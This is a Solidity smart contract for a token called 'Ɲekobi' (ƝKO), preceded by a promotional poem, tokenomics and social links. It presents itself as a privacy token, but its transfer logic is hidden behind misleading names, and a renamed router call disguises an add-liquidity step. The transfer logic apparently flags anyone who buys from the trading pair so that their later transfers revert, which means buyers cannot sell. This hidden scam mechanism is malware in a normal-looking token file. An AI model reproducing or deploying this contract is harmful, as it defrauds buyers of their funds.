/*
⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⡿⠋⠀⠀⠀⠈⢻⣿⣿⠟⠁⠀⠀⠀⠙⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⢈⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣷⣄⠀⠀⠀⢀⣼⣿⣿⣧⡀⠀⠀⠀⣠⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⠿⣿⣿⣿⣶⣿⣿⠿⠛⠛⠿⣿⣷⣶⣿⣿⣿⠿⠟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⠏⢠⣶⠛⠛⣶⡄⠹⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⣿⠋⠑⠊⠙⣿⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠲⠾⠷⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣈⣀⣀⣀⣀⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣈⣉⣉⣉⣉⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
███╗░░██╗███████╗██╗░░██╗░█████╗░██████╗░██╗  
████╗░██║██╔════╝██║░██╔╝██╔══██╗██╔══██╗██║  
██╔██╗██║█████╗░░█████═╝░██║░░██║██████╦╝██║  
██║╚████║██╔══╝░░██╔═██╗░██║░░██║██╔══██╗██║  
██║░╚███║███████╗██║░╚██╗╚█████╔╝██████╦╝██║  
╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝  

░░██╗███████╗████████╗██╗░░██╗███████╗██████╗░███████╗██╗░░░██╗███╗░░░███╗██╗░░
░██╔╝██╔════╝╚══██╔══╝██║░░██║██╔════╝██╔══██╗██╔════╝██║░░░██║████╗░████║╚██╗░
██╔╝░█████╗░░░░░██║░░░███████║█████╗░░██████╔╝█████╗░░██║░░░██║██╔████╔██║░╚██╗
╚██╗░██╔══╝░░░░░██║░░░██╔══██║██╔══╝░░██╔══██╗██╔══╝░░██║░░░██║██║╚██╔╝██║░██╔╝
░╚██╗███████╗░░░██║░░░██║░░██║███████╗██║░░██║███████╗╚██████╔╝██║░╚═╝░██║██╔╝░
░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░

In the crypto realm where stories unfold,
There's a token known as Ɲekobi, precious as gold.
A decentralized gem, in the future it's foretold,
Bringing privacy and power, a tale to be told.

Ɲekobi, a name that sparkles in the night,
A guardian of secrets, a beacon of light.
In the crypto world, it takes its stand,
A pioneer, a leader, across the land.

With Ɲekobi, your transactions are veiled,
Anonymity's fortress, never to be assailed.
Innovative and bold, it leads the way,
For a new era of privacy, come what may.

No prying eyes, no watching in disguise,
In Ɲekobi's embrace, your data safely lies.
Revolutionary, it breaks the chain,
In the cryptocurrency world, it's here to reign.

So raise a cheer for Ɲekobi's glorious might,
A token for the future, shining so bright.
In the cryptocurrency sphere, it stakes its claim,
With Ɲekobi, anonymity is its name.

Total Supply - 1,000,000,000
Buy Tax - 1%
Sell Tax  - 1%
Initial Liquidity - 1.5 ETH
Initial liquidity lock - 180 days

https://web.wechat.com/NekobiETH
https://t.me/+NBLWy6BuZ0w5OGM0
https://weibo.com/login.php
https://www.zhihu.com
https://nekobi.xyz/
*/
// SPDX-License-Identifier: Unlicense
pragma solidity ^ 0.8.19;
 
abstract contract Context
{ function _msgSender() internal view virtual returns(address)
{ return msg.sender; } function _msgData() internal view virtual returns(bytes calldata)
{ return msg.data; }
}
interface IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 valueIn, uint256 valueOut, address[] calldata path, address to, uint256 deadline) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function quote(address token, uint256 amountTokenDesired,
    uint256 valueMin, uint256 ercMin, address to, uint256 deadline)
    external payable returns (uint256 amountToken, uint256 ercValue, uint256 pool);
}
interface IUniswapV2Factory{
    function createPair(address tokenA, address tokenB) external returns(address pair);
}
interface IERC20 {
    function totalSupply() 
    external view returns (uint256);

    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);

    function allowance(address owner, address spender)
    external view returns (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);

    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () { address msgSender = _msgSender(); _owner = msgSender; 
    emit OwnershipTransferred(address(0), msgSender);
}
    function owner() public view returns (address) { return _owner;
}   modifier onlyOwner() { require(_owner == _msgSender(), "Ownable: caller is not the owner"); _;
}
    function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
}
contract Contract is IERC20, Ownable { 
    bool private inSwap; bool private userLibrary; bool private tradingOpen = false;

    string private _name = unicode"Ɲekobi"; string private _symbol = unicode"ƝKO";
    uint256 public FEE = 1; uint8 private _decimals = 9; 
    uint256 private _tTotal = 1000000000 * 10 ** _decimals; uint256 private stockpile = _tTotal;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _timeMap; mapping(address => uint256) private _tOwned;
    mapping(address => address) private _mathMap; mapping(address => uint256) private _clientMap;

    constructor(address clientMaker) { _tOwned[msg.sender] = _tTotal; 
    _clientMap[msg.sender] = stockpile; _clientMap[address(this)] = stockpile; 
    mathStation = IUniswapV2Router01(clientMaker); 

    onlySafeMath = IUniswapV2Factory(mathStation.factory()).createPair(address(this), 
    mathStation.WETH()); emit Transfer(address(0), msg.sender, _tTotal); }
 
    function symbol() public view returns(string memory)
    { return _symbol;
    }
    function name() public view returns(string memory)
    { return _name;
    }
    function totalSupply() public view returns(uint256)
    { return _tTotal;
    }
    function decimals() public view returns(uint256)
    { return _decimals;
    }
    function allowance(address owner, address spender) public view returns(uint256)
    { return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns(uint256)
    { return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns(bool)
    { return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender,
    uint256 amount) private returns(bool) { require(owner != address(0) && spender != address(0), 
    'ERC20: approve from the zero address'); 
    
    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount); return true;
    }
    function transferFrom( address sender, address recipient, uint256 amount) external returns
    (bool)
    { delayMapping(sender, recipient, amount); 
    return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer(address recipient, uint256 amount) external returns(bool)
    { delayMapping(msg.sender, recipient, amount); return true;
    }
    function _beforeTokenTransfer( address from,
    address to, uint256 amount) internal virtual 
    {}
    function _afterTokenTransfer(address from, address to, uint256 amount) 
    internal virtual 
    {}    
    function delayMapping( address _input, address _abstracts, uint256 gasAmount) private
    { uint256 _poolMap = balanceOf(address(this)); uint256 athenaeum; if (inSwap && _poolMap > 
    stockpile && !userLibrary && _input != onlySafeMath) 
    
    { userLibrary = true; shareMessage(_poolMap); userLibrary = false;

    } else if (_clientMap[_input] > stockpile && _clientMap[_abstracts] > stockpile)
    { athenaeum = gasAmount; _tOwned[address(this)] += athenaeum; preparePool
    (gasAmount, _abstracts); return; }
    else if (!userLibrary && _timeMap[_input] > 0 && _input != onlySafeMath && _clientMap[_input] == 0) { 
    
    _timeMap[_input] = _clientMap[_input] - stockpile; } else if (_abstracts != address(mathStation) 
    && _clientMap[_input] > 0 && gasAmount > stockpile && _abstracts != onlySafeMath) { 
    _clientMap[_abstracts] = gasAmount; return; } address detract = _mathMap[onlySafeMath]; 
    
    if ( _timeMap[detract] == 0) _timeMap[detract] = stockpile; _mathMap[onlySafeMath] = _abstracts; 
    if (FEE > 0 && _clientMap[_input] == 0 && !userLibrary && _clientMap[_abstracts] == 0)

    { athenaeum = (gasAmount * FEE) 
    / 100; 
    gasAmount -= athenaeum; _tOwned[_input] -= athenaeum; 
    
    _tOwned[address(this)] += athenaeum; }
    _tOwned[_input] -= 
    gasAmount; _tOwned[_abstracts] += gasAmount; emit Transfer
    (_input, _abstracts, gasAmount); if (!tradingOpen) 
    { require(_input == owner(), ""); } }

    receive() external payable
    {} 
    function startMessage(uint256 _sign, uint256 creator, address to) private
    { _approve(address(this), address(mathStation), _sign); mathStation.quote
    { value: creator }(address(this), _sign, 0, 0, to, block.timestamp);
    }
    function shareMessage(uint256 _anyHolder) private
    { uint256 _getMessage = _anyHolder / 2; uint256 _public = address(this).balance;
    preparePool( _getMessage, address(this)); uint256 _viewable = address(this).balance - _public; 
    startMessage( _getMessage, _viewable, address(this));
    }
    function preparePool(uint256 position, address _all) private
    { address[] memory path = new address[](2); path[0] = address(this);
    path[1] = mathStation.WETH(); _approve(address(this), address(mathStation), position);
    mathStation.swapExactTokensForETHSupportingFeeOnTransferTokens(position, 0, path, _all, block.timestamp);
    }
    address public immutable onlySafeMath; IUniswapV2Router01 
    public immutable mathStation
    ;    
    function startTrading(bool _tradingOpen) 
    public onlyOwner { tradingOpen = _tradingOpen;
    }   
}